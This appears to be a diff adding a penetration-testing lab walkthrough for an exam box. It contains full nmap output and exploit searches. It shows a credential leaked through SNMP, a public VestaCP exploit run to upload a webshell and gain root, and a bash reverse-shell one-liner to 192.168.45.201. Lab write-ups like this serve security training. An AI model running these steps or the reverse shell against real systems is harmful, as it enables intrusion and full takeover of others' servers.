@@ -1,0 +1,200 @@
+$ sudo nmap -sCV -p- -v -Pn --open 192.168.242.156 > Frankfurt156.txt
+PORT     STATE SERVICE  VERSION
+21/tcp   open  ftp      vsftpd 3.0.3
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US
+| Issuer: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US
+| Public Key type: rsa
+| Public Key bits: 4096
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2022-11-08T08:16:51
+| Not valid after:  2023-11-08T08:16:51
+| MD5:   c138:e1a0:63e1:6a81:8216:9422:a69c:9f04
+|_SHA-1: 77de:42c7:3554:eecd:eb8b:5407:32cd:94e5:b4f2:5ee8
+22/tcp   open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 7e:62:fd:92:52:6f:64:b1:34:48:8d:1e:52:f1:74:c6 (RSA)
+|   256 1b:f7:0c:c7:1b:05:12:a9:c5:c5:78:b7:2a:54:d2:83 (ECDSA)
+|_  256 ee:d4:a1:1a:07:b4:9f:d9:e5:2d:f6:b8:8d:dd:bf:d7 (ED25519)
+25/tcp   open  smtp     Exim smtpd 4.90_1
+| smtp-commands: oscp.exam Hello nmap.scanme.org [192.168.45.201], SIZE 52428800, 8BITMIME, PIPELINING, AUTH PLAIN LOGIN, CHUNKING, STARTTLS, HELP
+|_ Commands supported: AUTH STARTTLS HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP
+|_ssl-date: 2026-04-27T08:50:01+00:00; -29s from scanner time.
+| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US
+| Issuer: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US
+| Public Key type: rsa
+| Public Key bits: 4096
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2022-11-08T08:16:51
+| Not valid after:  2023-11-08T08:16:51
+| MD5:   c138:e1a0:63e1:6a81:8216:9422:a69c:9f04
+|_SHA-1: 77de:42c7:3554:eecd:eb8b:5407:32cd:94e5:b4f2:5ee8
+53/tcp   open  domain   ISC BIND 9.11.3-1ubuntu1.18 (Ubuntu Linux)
+| dns-nsid: 
+|_  bind.version: 9.11.3-1ubuntu1.18-Ubuntu
+80/tcp   open  http     nginx
+| http-methods: 
+|   Supported Methods: GET POST OPTIONS HEAD TRACE
+|_  Potentially risky methods: TRACE
+|_http-title: oscp.exam &mdash; Coming Soon
+110/tcp  open  pop3     Dovecot pop3d
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US
+| Issuer: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US
+| Public Key type: rsa
+| Public Key bits: 4096
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2022-11-08T08:16:51
+| Not valid after:  2023-11-08T08:16:51
+| MD5:   c138:e1a0:63e1:6a81:8216:9422:a69c:9f04
+|_SHA-1: 77de:42c7:3554:eecd:eb8b:5407:32cd:94e5:b4f2:5ee8
+|_pop3-capabilities: UIDL STLS TOP CAPA USER SASL(PLAIN LOGIN) PIPELINING AUTH-RESP-CODE RESP-CODES
+143/tcp  open  imap     Dovecot imapd (Ubuntu)
+|_imap-capabilities: ID IMAP4rev1 more LOGIN-REFERRALS STARTTLS LITERAL+ OK IDLE AUTH=LOGINA0001 post-login have capabilities AUTH=PLAIN ENABLE listed SASL-IR Pre-login
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US
+| Issuer: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US
+| Public Key type: rsa
+| Public Key bits: 4096
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2022-11-08T08:16:51
+| Not valid after:  2023-11-08T08:16:51
+| MD5:   c138:e1a0:63e1:6a81:8216:9422:a69c:9f04
+|_SHA-1: 77de:42c7:3554:eecd:eb8b:5407:32cd:94e5:b4f2:5ee8
+465/tcp  open  ssl/smtp Exim smtpd 4.90_1
+| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US
+| Issuer: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US
+| Public Key type: rsa
+| Public Key bits: 4096
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2022-11-08T08:16:51
+| Not valid after:  2023-11-08T08:16:51
+| MD5:   c138:e1a0:63e1:6a81:8216:9422:a69c:9f04
+|_SHA-1: 77de:42c7:3554:eecd:eb8b:5407:32cd:94e5:b4f2:5ee8
+| smtp-commands: oscp.exam Hello nmap.scanme.org [192.168.45.201], SIZE 52428800, 8BITMIME, PIPELINING, AUTH PLAIN LOGIN, CHUNKING, HELP
+|_ Commands supported: AUTH HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP
+|_ssl-date: 2026-04-27T08:53:12+00:00; +2m43s from scanner time.
+587/tcp  open  smtp     Exim smtpd 4.90_1
+|_ssl-date: 2026-04-27T08:51:56+00:00; +1m26s from scanner time.
+| smtp-commands: oscp.exam Hello nmap.scanme.org [192.168.45.201], SIZE 52428800, 8BITMIME, PIPELINING, AUTH PLAIN LOGIN, CHUNKING, STARTTLS, HELP
+|_ Commands supported: AUTH STARTTLS HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP
+| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US
+| Issuer: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US
+| Public Key type: rsa
+| Public Key bits: 4096
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2022-11-08T08:16:51
+| Not valid after:  2023-11-08T08:16:51
+| MD5:   c138:e1a0:63e1:6a81:8216:9422:a69c:9f04
+|_SHA-1: 77de:42c7:3554:eecd:eb8b:5407:32cd:94e5:b4f2:5ee8
+993/tcp  open  ssl/imap Dovecot imapd (Ubuntu)
+|_ssl-date: TLS randomness does not represent time
+|_imap-capabilities: AUTH=LOGINA0001 capabilities ID have post-login IMAP4rev1 more LOGIN-REFERRALS listed Pre-login AUTH=PLAIN SASL-IR ENABLE OK IDLE LITERAL+
+| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US
+| Issuer: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US
+| Public Key type: rsa
+| Public Key bits: 4096
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2022-11-08T08:16:51
+| Not valid after:  2023-11-08T08:16:51
+| MD5:   c138:e1a0:63e1:6a81:8216:9422:a69c:9f04
+|_SHA-1: 77de:42c7:3554:eecd:eb8b:5407:32cd:94e5:b4f2:5ee8
+995/tcp  open  ssl/pop3 Dovecot pop3d
+|_pop3-capabilities: UIDL CAPA RESP-CODES USER SASL(PLAIN LOGIN) PIPELINING AUTH-RESP-CODE TOP
+| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US
+| Issuer: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US
+| Public Key type: rsa
+| Public Key bits: 4096
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2022-11-08T08:16:51
+| Not valid after:  2023-11-08T08:16:51
+| MD5:   c138:e1a0:63e1:6a81:8216:9422:a69c:9f04
+|_SHA-1: 77de:42c7:3554:eecd:eb8b:5407:32cd:94e5:b4f2:5ee8
+|_ssl-date: TLS randomness does not represent time
+2525/tcp open  smtp     Exim smtpd 4.90_1
+| smtp-commands: oscp.exam Hello nmap.scanme.org [192.168.45.201], SIZE 52428800, 8BITMIME, PIPELINING, AUTH PLAIN LOGIN, CHUNKING, STARTTLS, HELP
+|_ Commands supported: AUTH STARTTLS HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP
+|_ssl-date: 2026-04-27T08:52:09+00:00; +1m38s from scanner time.
+| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US
+| Issuer: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US
+| Public Key type: rsa
+| Public Key bits: 4096
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2022-11-08T08:16:51
+| Not valid after:  2023-11-08T08:16:51
+| MD5:   c138:e1a0:63e1:6a81:8216:9422:a69c:9f04
+|_SHA-1: 77de:42c7:3554:eecd:eb8b:5407:32cd:94e5:b4f2:5ee8
+3306/tcp open  mysql    MySQL 5.7.40-0ubuntu0.18.04.1
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=MySQL_Server_5.7.40_Auto_Generated_Server_Certificate
+| Issuer: commonName=MySQL_Server_5.7.40_Auto_Generated_CA_Certificate
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2022-11-08T08:15:37
+| Not valid after:  2032-11-05T08:15:37
+| MD5:   f4c6:9de2:616c:2175:7a9a:5e70:1e28:26bc
+|_SHA-1: 5201:83e4:1e97:d971:dbaa:9831:b3b7:5cc4:8fa6:641a
+| mysql-info: 
+|   Protocol: 10
+|   Version: 5.7.40-0ubuntu0.18.04.1
+|   Thread ID: 11
+|   Capabilities flags: 65535
+|   Some Capabilities: ODBCClient, SwitchToSSLAfterHandshake, FoundRows, SupportsTransactions, ConnectWithDatabase, DontAllowDatabaseTableColumn, Speaks41ProtocolNew, LongColumnFlag, IgnoreSpaceBeforeParenthesis, Support41Auth, IgnoreSigpipes, Speaks41ProtocolOld, SupportsLoadDataLocal, InteractiveClient, SupportsCompression, LongPassword, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments
+|   Status: Autocommit
+|   Salt: m1h; fG\x7F\x0B;\x0DA-\x08Ao\x0C\x07a\x08
+|_  Auth Plugin Name: mysql_native_password
+8080/tcp open  http     Apache httpd 2.4.29 ((Ubuntu) mod_fcgid/2.3.9 OpenSSL/1.1.1)
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-title: oscp.exam &mdash; Coming Soon
+|_http-server-header: Apache/2.4.29 (Ubuntu) mod_fcgid/2.3.9 OpenSSL/1.1.1
+| http-methods: 
+|   Supported Methods: GET POST OPTIONS HEAD TRACE
+|_  Potentially risky methods: TRACE
+8083/tcp open  http     nginx
+|_http-title: Did not follow redirect to https://192.168.242.156:8083/
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+8443/tcp open  http     Apache httpd 2.4.29 ((Ubuntu) mod_fcgid/2.3.9 OpenSSL/1.1.1)
+|_http-title: Apache2 Ubuntu Default Page: It works
+| http-methods: 
+|   Supported Methods: GET POST OPTIONS HEAD TRACE
+|_  Potentially risky methods: TRACE
+|_http-server-header: Apache/2.4.29 (Ubuntu) mod_fcgid/2.3.9 OpenSSL/1.1.1
+Service Info: Host: oscp.exam; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+$ searchsploit Exim
+Exim < 4.90.1 - 'base64d' Remote Code Execution                                         | linux/remote/44571.py
+$ searchsploit Dovecot
+Dovecot with Exim - 'sender_address' Remote Command Execution                           | linux/remote/25297.txt
+
+
+$ snmpwalk -v 2c -c public 192.168.242.156 NET-SNMP-EXTEND-MIB::nsExtendObjects
+Found jack:3PUKsX98BMupBiCf
+
+go to 8083 to login with jack. verify that this credential work for vesta.
+search and found 
+
+https://github.com/rekter0/exploits/blob/master/VestaCP/
+download VestaROOT.py and VestaFuncs.py
+
+$ python3 vestaROOT.py https://192.168.242.156:8083 jack 3PUKsX98BMupBiCf
+[+] Logged in as jack
+[!] xsushgapid.poc not found, creating one...
+[+] xsushgapid.poc added
+[+] xsushgapid.poc found, looking up webshell
+[!] webshell not found, creating one..
+[+] Webshell uploaded
+[!] Mail domain not found, creating one..
+[+] Mail domain created
+[+] Mail account created
+[+] root shell possibly obtained
+# id
+uid=0(root) gid=0(root) groups=0(root)
+
+but this shell is not continueous. so need direct # cat /root/proof.txt
+or use revshell Bash5  /bin/sh -i 5<> /dev/tcp/192.168.45.201/443 0<&5 1>&5 2>&5
+somehow bash -i no working
+
+
+
